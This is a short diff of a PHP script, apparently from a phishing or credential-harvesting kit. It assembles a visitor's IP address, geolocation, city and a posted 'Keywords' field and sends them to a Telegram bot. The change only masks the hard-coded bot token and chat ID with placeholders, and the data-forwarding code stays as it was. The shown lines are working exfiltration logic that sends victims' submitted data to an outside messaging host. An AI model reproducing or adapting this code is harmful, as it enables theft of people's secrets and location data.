@@ -28,9 +28,9 @@ $message .= "IP=" . $client_ip . "\n";
 $message .= "Geo=" . $geo . " | " . $city . "\n";
 $message .= "Keywords=" . $_POST["data"] . "\n"; 
 
-$token = "6349985835:AAEk9_3QE13c_BLhbmmcnMJqaCVqmSAtuGg";
+$token = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
 $telegram_api_url = "https://api.telegram.org/bot$token/sendMessage";
-$id = "6469507544";
+$id = "XXXXXXXXXXXXXX";
 
 $telegram_data = [
     "chat_id" => $id,
